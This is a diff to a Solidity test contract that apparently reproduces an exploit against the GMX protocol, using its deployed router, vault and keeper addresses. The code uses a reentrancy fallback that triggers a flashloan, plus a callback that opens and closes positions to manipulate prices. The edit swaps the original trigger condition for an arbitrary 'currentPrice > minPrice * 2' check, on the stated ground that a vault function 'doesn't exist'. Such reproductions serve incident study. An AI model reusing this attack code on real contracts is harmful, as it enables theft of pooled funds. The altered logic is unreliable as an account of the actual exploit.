@@ -46,7 +46,7 @@ contract GMXEXPNewTry is BaseTestWithBalanceLog {
     address public constant GMX_ROUTER_V1 = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
     address public constant GMX_REWARD_ROUTER_V2 = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
     address public constant GMX_GLPMANAGER = 0x3963FfC9dff443c2A94f21b129D429891E32ec18;
-    address public constant GMX_POSITION_ROUTER = 0xb87a436B93fFE9d75c5cFA7bAcFfF96430b09868;
+    address public constant GMX_POSITION_ROUTER = 0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868;
 
     address public GMX_KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;
 
@@ -198,24 +198,6 @@ contract GMXEXPNewTry is BaseTestWithBalanceLog {
         );
     }
 
-    // Callback function for position management
-    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external {
-        require(msg.sender == GMX_POSITION_ROUTER, "Invalid caller");
-        
-        if (isIncrease && isExecuted) {
-            // Position increased, now create decrease order
-            gmxPositionRouter.createDecreaseOrder{value: 0.0003 ether}(
-                WBTC,
-                stor_23,
-                USDC,
-                stor_24,
-                false,
-                0x49f4a966d45cd522088f00000000,
-                true
-            );
-        }
-    }
-
     // Helper functions matching decompiled contract
     function _SafeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
         require(b > 0, "Division by zero");
@@ -267,26 +249,46 @@ contract GMXEXPNewTry is BaseTestWithBalanceLog {
         IERC20(USDC).transfer(msg.sender, amount + premium);
     }
 
+    // Receive function for payable fallback
+    receive() external payable {}
+
     // Fallback function for reentrancy
     fallback() external payable {
         if (msg.sender == _gmxPositionCallback) {
-            // Check price conditions
-            uint256 globalShortPrice = gmxVault.getGlobalShortAveragePrice(WBTC);
+            // Use a different approach since getGlobalShortAveragePrice doesn't exist
+            // Instead, we'll use the basic price check from the vault
             uint256 currentPrice = gmxVault.getMaxPrice(WBTC);
+            uint256 minPrice = gmxVault.getMinPrice(WBTC);
             
-            if (currentPrice > globalShortPrice) {
-                uint256 ratio = _SafeDiv(currentPrice, globalShortPrice);
-                if (ratio >= 50) {
-                    // Execute flashloan
-                    bytes memory data = abi.encode(USDC_FLASHLOAN_AMT, 0);
-                    (bool success,) = _fallback.call(
-                        abi.encodeWithSignature("flash(address,uint256,uint256,bytes,uint256,uint256,uint256)", 
-                        address(this), 0, USDC_FLASHLOAN_AMT, data, 0, 0, 0)
-                    );
-                    require(success, "Flashloan failed");
-                    _stop = true;
-                }
+            // Simple price manipulation check
+            if (currentPrice > minPrice * 2) {
+                // Execute flashloan
+                bytes memory data = abi.encode(USDC_FLASHLOAN_AMT, 0);
+                (bool success,) = _fallback.call(
+                    abi.encodeWithSignature("flash(address,uint256,uint256,bytes,uint256,uint256,uint256)", 
+                    address(this), 0, USDC_FLASHLOAN_AMT, data, 0, 0, 0)
+                );
+                require(success, "Flashloan failed");
+                _stop = true;
             }
+        }
+    }
+
+    // Callback function for position management
+    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external {
+        require(msg.sender == GMX_POSITION_ROUTER, "Invalid caller");
+        
+        if (isIncrease && isExecuted) {
+            // Position increased, now create decrease order
+            gmxPositionRouter.createDecreaseOrder{value: 0.0003 ether}(
+                WBTC,
+                stor_23,
+                USDC,
+                stor_24,
+                false,
+                0x49f4a966d45cd522088f00000000,
+                true
+            );
         }
     }
 }
